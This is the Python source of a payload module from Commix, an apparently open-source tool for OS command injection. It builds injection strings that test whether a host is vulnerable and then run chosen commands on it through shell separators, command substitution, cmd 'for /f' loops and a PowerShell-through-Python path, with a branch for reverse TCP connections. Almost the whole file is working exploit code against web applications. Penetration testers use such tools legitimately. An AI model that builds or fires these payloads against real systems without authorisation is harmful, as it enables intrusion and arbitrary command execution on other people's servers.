#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
The classic injection technique on Classic OS Command Injection.
The available "classic" payloads.
"""

"""
Classic decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.SKIP_CALC:
      payload = (chain +
                "echo " + TAG + TAG + TAG
                )
    else:
      # 'set /p' prints its prompt without a trailing newline, so the marker arrives in one piece.
      payload = (chain +
              "for /f \"tokens=* eol=\" %i in ('cmd /c \"" +
              "set /a (" + str(randv1) + "+" + str(randv2) + ")" +
              "\"') do @" + settings.CMD_NUL + " set /p=" + TAG + "%i" + TAG + TAG
              )
  else:
    if settings.SKIP_CALC:
      payload = (separator +
                "echo " + TAG +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
                )
    else:
      if checks.using_backticks() or settings.WAF_ENABLED:
        math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " + " + str(randv2) + settings.CMD_SUB_SUFFIX
      else:
        # Arithmetic expansion is the substitution pair with one more set of parentheses inside it.
        math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "+" + str(randv2) + ")" + settings.CMD_SUB_SUFFIX
      payload = (separator +
                "echo " + TAG +
                math_calc +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
                )

    payload = checks.terminate_payload(payload, separator, keep_output=True)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.SKIP_CALC:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'+'" + TAG + "'+'" + TAG + "')\""
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'+str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + "))" + "+'" + TAG + "'+'" + TAG + "')\""

    payload = (chain +
              "for /f \"tokens=* eol=\" %i in ('cmd /c " +
              python_payload +
              "') do @" + settings.CMD_NUL + " set /p=%i"
              )
  else:
    if settings.SKIP_CALC:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                TAG +
                TAG + "')\""
                )
    else:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                "'+str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + "))" + "+'" +
                TAG + "'+'" +
                TAG + "')\""
                )

    payload = checks.terminate_payload(payload, separator, keep_output=True)

  return payload

"""
A command's output as a single line, with every byte it printed still in it.

'echo' is handed the output through a substitution, and an unquoted one is split into words and
rejoined with one space each - so runs of whitespace inside the output collapse and its ends are
dropped. Quoted instead, that whitespace survives but so do the newlines, and a sink handing back
only the last line of what it ran then answers with nothing at all. Both are avoided by asking
'awk' for the output with its newlines replaced, the way the file-based technique asks 'tr' for it:
the value goes in as an argument rather than through a pipe, so nothing is introduced that the
payload is not proving, and the program is a single statement, so it needs no separator of its own
either - 'gsub' is read for the condition of a choice whose answers are the same, since it hands
back a count rather than the string it rewrote. Replaced with 'OFS', a literal space being the
whitespace substitution's to take even inside awk's own quotes.
"""
def single_line_output(cmd):
  return (settings.CMD_SUB_PREFIX + "LC_ALL=C awk 'BEGIN{print(gsub(/" +
          settings.END_LINE.ESCAPED_LF + "/,OFS,ARGV[1])?ARGV[1]:ARGV[1])}' \"" +
          settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" +
          settings.CMD_SUB_SUFFIX)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.REVERSE_TCP:
      payload = (chain +
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      payload = (chain +
                "for /f \"tokens=* eol=\" %i in ('cmd /c \"" +
                cmd +
                "\"') do @" + settings.CMD_NUL + " set /p=" + TAG + TAG + "%i" + TAG + TAG
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    # Asked for only where the payload still reaches the target written the way it was built. A
    # script rewriting it works over the quoting itself, and this reading puts a quoted
    # substitution inside a quoted one - a level deeper than anything else here - which six of
    # those scripts take apart and one turns into a command that waits. Where any is in effect, or
    # the substitution in use cannot hold another, the output goes in the way it always did: split
    # into words by the shell and rejoined with one space each, which collapses the whitespace
    # inside it but does leave the one line the markers are looked for on - a collapsed answer
    # rather than no answer.
    exact = (settings.RESULTS_BASED_EXACT_OUTPUT and checks.substitution_nests()
             and not any(settings.TAMPER_SCRIPTS.values()))
    if exact:
      # Written with 'printf' rather than 'echo', which on the shell '/bin/sh' usually is reads the
      # backslashes of what it was handed and a leading '-n' or '-e' of it as options of its own:
      # a path of "C:\path\to\file" came back carrying a tab and a formfeed. The markers go in the
      # format, where they are still the shell's to read, and the output goes in as the argument of
      # a '%s' - written out a byte at a time, and quoted, since it is one line by now with no
      # newline left for the page to lose.
      payload = (separator +
                "printf " + TAG +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
                "%s" +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG +
                " \"" + single_line_output(cmd) + "\""
                )
    else:
      payload = (separator +
                "echo " + TAG +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
                settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX +
                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
                )

    payload = checks.terminate_payload(payload, separator, keep_output=True)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    if settings.REVERSE_TCP:
      payload = (chain +
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      # Run through 'cmd /c', or PowerShell would look the command up among its own cmdlets.
      payload = (chain +
                "for /f \"tokens=* eol=\" %i in ('" +
                settings.WIN_PYTHON_INTERPRETER +
                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " +
                TAG + TAG + " $(cmd /c " + cmd + ") "+ TAG + TAG + "')\"" +
                "') do @" + settings.CMD_NUL + " set /p=%i"
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
    # Handed to the interpreter as an argument rather than written into the program it is given to
    # run. Written in, the output sat inside a quoted string there, so a quote of its own closed
    # that string early and the interpreter answered with a syntax error rather than with the
    # command's output - silently, the run reporting nothing at all for a command that worked. The
    # way the tempfile-based technique already passes it, and no second substitution to nest.
    payload = (separator +
              settings.LINUX_PYTHON_INTERPRETER +
              " -c \"import sys" + settings.END_LINE.CR +
              "print('" + TAG + "'+'" + TAG + "'+sys.argv[1]+'" +
              TAG + "'+'" + TAG + "')\" \"" + cmd_exec + "\""
              )

    payload = checks.terminate_payload(payload, separator, keep_output=True)

  return payload

# eof
